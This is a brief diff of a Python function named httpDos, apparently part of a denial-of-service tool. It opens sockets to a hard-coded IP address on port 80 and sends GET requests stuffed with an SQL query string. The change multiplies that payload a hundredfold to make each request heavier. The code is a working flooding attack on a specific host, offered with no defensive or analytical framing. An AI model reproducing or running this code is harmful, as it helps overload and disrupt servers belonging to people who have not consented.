@@ -14,7 +14,7 @@ def httpDos():
 		mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		try:
 			mysocket.connect(("130.73.201.41", 80))
-			mysocket.send("GET " + SQL_QUERY + "HTTP/1.1\r\n")
+			mysocket.send("GET " + 100 * SQL_QUERY + "HTTP/1.1\r\n")
 			mysocket.sendto("GET " + SQL_QUERY + "HTTP/1.1\r\n", ("130.73.201.41", 80))
 		except socket.error:
 			print("ERR ")
